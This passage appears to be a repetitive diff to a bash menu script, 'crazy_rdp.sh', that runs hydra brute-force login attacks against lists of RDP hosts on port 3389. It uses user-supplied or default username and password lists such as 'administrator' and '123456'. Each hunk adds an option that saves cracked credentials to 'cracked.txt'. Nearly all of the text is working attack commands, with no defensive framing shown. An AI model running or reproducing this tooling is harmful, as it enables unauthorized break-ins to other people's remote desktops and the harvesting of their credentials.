 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2491,7 +2491,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2500,7 +2500,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2544,7 +2544,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2554,7 +2554,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2564,7 +2564,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2573,7 +2573,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2617,7 +2617,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2627,7 +2627,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2637,7 +2637,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2646,7 +2646,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2690,7 +2690,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2700,7 +2700,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2710,7 +2710,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2719,7 +2719,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2762,7 +2762,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2772,7 +2772,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2782,7 +2782,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2791,7 +2791,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2835,7 +2835,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2845,7 +2845,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2855,7 +2855,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2864,7 +2864,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2907,7 +2907,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2917,7 +2917,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2927,7 +2927,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2936,7 +2936,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2979,7 +2979,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2989,7 +2989,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2999,7 +2999,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3008,7 +3008,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3050,7 +3050,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3060,7 +3060,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3070,7 +3070,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3079,7 +3079,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3123,7 +3123,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3133,7 +3133,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3143,7 +3143,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3152,7 +3152,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3196,7 +3196,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3206,7 +3206,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3216,7 +3216,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3225,7 +3225,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3269,7 +3269,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3279,7 +3279,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3289,7 +3289,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3298,7 +3298,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3342,7 +3342,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3352,7 +3352,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3362,7 +3362,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3371,7 +3371,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3415,7 +3415,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3425,7 +3425,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3435,7 +3435,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3444,7 +3444,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3488,7 +3488,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3498,7 +3498,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3508,7 +3508,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3517,7 +3517,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3561,7 +3561,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3571,7 +3571,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3581,7 +3581,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3590,7 +3590,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
